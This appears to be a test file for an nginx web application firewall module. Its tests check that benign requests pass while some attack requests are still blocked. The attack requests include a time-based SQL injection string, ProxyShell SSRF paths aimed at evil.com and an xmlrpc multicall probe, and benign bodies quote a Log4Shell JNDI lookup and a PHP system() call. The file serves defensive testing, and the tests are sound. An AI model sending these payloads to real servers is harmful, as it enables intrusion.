# False-positive guard: benign requests that superficially resemble attacks
# but must NOT be blocked. This is the test that keeps signatures honest -- if
# a new pattern is too broad (a bare keyword instead of a multi-token combo),
# one of these starts failing.
use Test::Nginx::Socket 'no_plan';

repeat_each(1);
no_long_string();
run_tests();

__DATA__

=== TEST 1: the word "select" alone is fine
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?action=select&sort=order
--- error_code: 200

=== TEST 2: "union" as a plain word is fine
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?q=european+union+history
--- error_code: 200

=== TEST 3: a path segment containing ".." dot-dot in a filename word
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?title=the.matrix.reloaded
--- error_code: 200

=== TEST 4: "or" and "and" in normal prose
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?q=cats+or+dogs+and+birds
--- error_code: 200

=== TEST 5: a normal filename ending in .php
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t/wp-content/plugins/akismet/index.php
--- error_code: 200

=== TEST 6: a URL with an http:// in a legitimate redirect param is fine
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?return=https://example.com/account
--- error_code: 200

=== TEST 7: "sleep" as an ordinary word (no call parens)
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?q=how+to+sleep+better
--- error_code: 200

=== TEST 8: JSON body with an "onload" field name is fine
--- config
    location /t { shield block; empty_gif; }
--- request
POST /t
{"onloaded":true,"documentTitle":"my cookies recipe"}
--- more_headers
Content-Type: application/json
--- error_code: 405

=== TEST 9: a query mentioning "runtime" as a word
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?q=java+runtime+environment+download
--- error_code: 200

=== TEST 10: a normal environment word without the /.env path
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?section=environment
--- error_code: 200

=== TEST 11: a param named "gt"/"ne" without the operator-bracket form
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?sort=gt&order=ne&greater=true
--- error_code: 200

=== TEST 12: mustache-looking value without the SSTI probe form
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?tpl=hello%20%7B%7Bname%7D%7D%20welcome%20back
--- error_code: 200

=== TEST 13: "runtime"/"configuration" prose is fine
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?q=spring%20boot%20runtime%20configuration%20guide
--- error_code: 200

=== TEST 14: a legitimate redirect to an https URL is fine
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?redirect_uri=https://app.example.com/callback&next=https://example.com/
--- error_code: 200

=== TEST 15: a normal Git-related word without the /.git/ path
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?repo=github-actions&topic=gitops
--- error_code: 200

=== TEST 16: a JSON body with a legit "type" field (not @type gadget)
--- config
    location /t { shield block; empty_gif; }
--- request
POST /t
{"type":"user","name":"alice","runtime":"node"}
--- more_headers
Content-Type: application/json
--- error_code: 405

=== TEST 17: an actuator health check that is not the gateway RCE path
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t/actuator/health
--- error_code: 200


=== TEST 18: a real Grafana plugin asset (no traversal) is fine
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t/public/plugins/grafana-piechart-panel/module.js
--- error_code: 200

=== TEST 19: a legitimate Metabase setup call during install (no H2 gadget)
--- config
    location /api/setup/validate { shield block; empty_gif; }
--- request
GET /api/setup/validate?token=abc123
--- error_code: 200

=== TEST 20: a normal OFBiz control request without the auth-bypass param
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t/webtools/control/main?view=dashboard
--- error_code: 200

=== TEST 21: a JSON body mentioning runtime/exec as data, not an OGNL gadget
--- config
    location /t { shield block; empty_gif; }
--- request
POST /t
{"description":"the java runtime exec plugin settings"}
--- more_headers
Content-Type: application/json
--- error_code: 405

=== TEST 22: a request to a plain /api/token endpoint (not the IMDS path)
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t/api/token?grant_type=client_credentials
--- error_code: 200

=== TEST 23: an SQL tutorial query mentioning sleep() as prose
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?q=how+to+use+sleep(5)+in+mysql
--- error_code: 200

=== TEST 24: a legitimate WordPress wp.getUsersBlogs XML-RPC call
--- config
    location /t { shield block; shield_body on; empty_gif; }
--- request eval
"POST /t
<methodCall><methodName>wp.getUsersBlogs</methodName></methodCall>"
--- more_headers
Content-Type: text/xml
--- error_code: 405

=== TEST 25: a normal Microsoft Autodiscover request
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t/autodiscover/autodiscover.json?Email=user@example.com&Protocol=Autodiscoverv1
--- error_code: 200

=== TEST 26: time-based SQLi in quote context is still blocked
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?id=1'+or+sleep(5)--
--- error_code: 403

=== TEST 27: ProxyShell path-confusion Autodiscover SSRF is still blocked
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?p=/autodiscover/autodiscover.json?@evil.com/mapi/nspi/
--- error_code: 403

=== TEST 28: encoded ProxyShell path-confusion marker is still blocked
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?p=autodiscover.json%3f@evil.com/powershell
--- error_code: 403

=== TEST 29: xmlrpc system.multicall amplification is still blocked
--- config
    location /t { shield block; shield_body on; empty_gif; }
--- request eval
"POST /t
<methodCall><methodName>system.multicall</methodName></methodCall>"
--- more_headers
Content-Type: text/xml
--- error_code: 403

=== TEST 30: Grafana serving a plugin asset is not a traversal
# AND-rule terms in isolation (TESTS 30-34). Each is one term of an AND-rule.
# Alone, every one of them is ordinary traffic, and blocking it is exactly the
# false positive the rule exists to avoid. Only the full term set (t/07) blocks.
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?url=/public/plugins/graph/module.js
--- error_code: 200

=== TEST 31: an OFBiz password-change flow is not an auth bypass
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?requirePasswordChange=Y
--- error_code: 200

=== TEST 32: Metabase first-run setup validation is not an RCE
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?next=/api/setup/validate
--- error_code: 200

=== TEST 33: the word sleep( in prose is not time-based SQLi
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?q=how%20does%20sleep(3)%20work%20in%20mysql
--- error_code: 200

=== TEST 34: a UTF-8 path is not a control character
# ctrl_char flags C0 bytes (< 0x20) only. UTF-8 continuation bytes are >= 0x80
# and must not trip it, or every non-ASCII URL on the internet breaks.
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t/caf%C3%A9/%E6%97%A5%E6%9C%AC
--- error_code: 200

=== TEST 35: a tab-free ordinary path with punctuation is not a control char
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t/a-b_c.d~e/f%20g
--- error_code: 200

=== TEST 36: a JSON body carrying a JavaScript function literal is not shellshock
# The bare "() {" prologue used to be a signature. It is also the anonymous
# function token of JavaScript, so every request that stores JS source -- a CMS
# theme editor, a paste bin, a snippet API -- was blocked as shellshock.
--- config
    location /t { shield block; shield_body on; empty_gif; }
--- request eval
"POST /t
{\"code\":\"var f = function() { return 1; };\"}"
--- more_headers
Content-Type: application/json
--- error_code: 405

=== TEST 37: a form-urlencoded body of minified JavaScript is not shellshock
--- config
    location /t { shield block; shield_body on; empty_gif; }
--- request eval
"POST /t
js=%28function%28%29%20%7B%20window.x%20%3D%201%3B%20%7D%29%28%29"
--- more_headers
Content-Type: application/x-www-form-urlencoded
--- error_code: 405

=== TEST 38: a jQuery-style callback in a query string is not shellshock
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?cb=%24%28document%29.ready%28function%28%29%20%7B%20init%28%29%3B%20%7D%29
--- error_code: 200

=== TEST 39: an underscore-bodied JS function is not shellshock
# "() { _;}" IS valid JavaScript. The CVE-2014-6278 signature therefore carries
# the redirection gadget too, so this benign shape stays unmatched.
--- config
    location /t { shield block; shield_body on; empty_gif; }
--- request eval
"POST /t
{\"fn\":\"function() { _; }\"}"
--- more_headers
Content-Type: application/json
--- error_code: 405

=== TEST 40: a percent sign followed by ordinary text is not double-encoding
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?q=100%25%20discount
--- error_code: 200

=== TEST 41: a legitimately percent-encoded UTF-8 query is not an overlong form
# %c3%a9 is the CORRECT two-byte encoding of 'e-acute'. Only the OVERLONG
# encodings are signatures, so real accented text must pass.
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?name=caf%c3%a9
--- error_code: 200

=== TEST 42: a fullwidth solidus is a real character, not an evasion
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?q=%ef%bc%8f
--- error_code: 200

=== TEST 43: a literal "u002f" in a value is not a %u escape
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?token=abcu002fdef
--- error_code: 200

=== TEST 44: a CI script in a JSON body is not command injection
# TESTS 44-47: the body-scan position rule. These tokens have no benign reading
# in a request TARGET, and the categories still block them there (t/06 TESTS
# 39-42). In a text/JSON BODY they are ordinary content -- a CI config, a
# Dockerfile, a consent banner, a blog post about Log4Shell -- so the
# categories that own them carry NGX_HTTP_SHIELD_NO_BODY.
--- config
    location /t { shield block; shield_body on; empty_gif; }
--- request eval
"POST /t
{\"script\":\"#!/bin/sh\\nmake test\"}"
--- more_headers
Content-Type: application/json
--- error_code: 405

=== TEST 45: a Dockerfile paste naming /bin/bash is not command injection
--- config
    location /t { shield block; shield_body on; empty_gif; }
--- request eval
"POST /t
{\"dockerfile\":\"SHELL [\\\"/bin/bash\\\", \\\"-c\\\"]\"}"
--- more_headers
Content-Type: application/json
--- error_code: 405

=== TEST 46: consent-banner JavaScript reading document.cookie is not XSS
--- config
    location /t { shield block; shield_body on; empty_gif; }
--- request eval
"POST /t
{\"js\":\"if (document.cookie.indexOf('consent') < 0) show();\"}"
--- more_headers
Content-Type: application/json
--- error_code: 405

=== TEST 47: a blog post ABOUT Log4Shell is not a Log4Shell attempt
--- config
    location /t { shield block; shield_body on; empty_gif; }
--- request eval
"POST /t
{\"post\":\"Attackers sent \${jndi:ldap://evil/x} in the User-Agent.\"}"
--- more_headers
Content-Type: application/json
--- error_code: 405

=== TEST 48: a code-review body containing PHP source is not php_rce
--- config
    location /t { shield block; shield_body on; empty_gif; }
--- request eval
"POST /t
{\"diff\":\"- <?php system(\$cmd); // removed, see CVE-2012-1823\"}"
--- more_headers
Content-Type: application/json
--- error_code: 405

=== TEST 49: a docs body naming /etc/passwd is not a sensitive-file probe
--- config
    location /t { shield block; shield_body on; empty_gif; }
--- request eval
"POST /t
{\"doc\":\"User accounts are listed in /etc/passwd on Unix.\"}"
--- more_headers
Content-Type: application/json
--- error_code: 405

=== TEST 50: a CVE writeup body naming n-day exploit paths is not exploit_path
# exploit_path is NO_BODY: its signatures are request PATHS, delivered in the
# target, never the body. A security blog or changelog that names the path in
# prose must not be blocked. Two well-known members in one benign body.
--- config
    location /t { shield block; shield_body on; empty_gif; }
--- request eval
"POST /t
{\"post\":\"WebLogic /wls-wsat/CoordinatorPortType was CVE-2017-10271; the OFBiz /webtools/control/ProgramExport RCE was CVE-2023-49070.\"}"
--- more_headers
Content-Type: application/json
--- error_code: 405

=== TEST 51: a changelog body naming the phase-4 n-day paths is not exploit_path
# Same NO_BODY guarantee for the paths added in the CVE sweep: naming them in
# prose is ordinary security-writeup content, not an attack.
--- config
    location /t { shield block; shield_body on; empty_gif; }
--- request eval
"POST /t
{\"note\":\"Patched MOVEit /moveitisapi/moveitisapi.dll and TeamCity /app/rest/debug/authenticationtest.jsp today.\"}"
--- more_headers
Content-Type: application/json
--- error_code: 405

=== TEST 52: the Jenkins remoting=true toggle alone is not command injection
# A rule TERM on its own must never block: "remoting=true" is an ordinary
# query value until it is paired with the /cli endpoint.
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?transport=remoting=true
--- error_code: 200
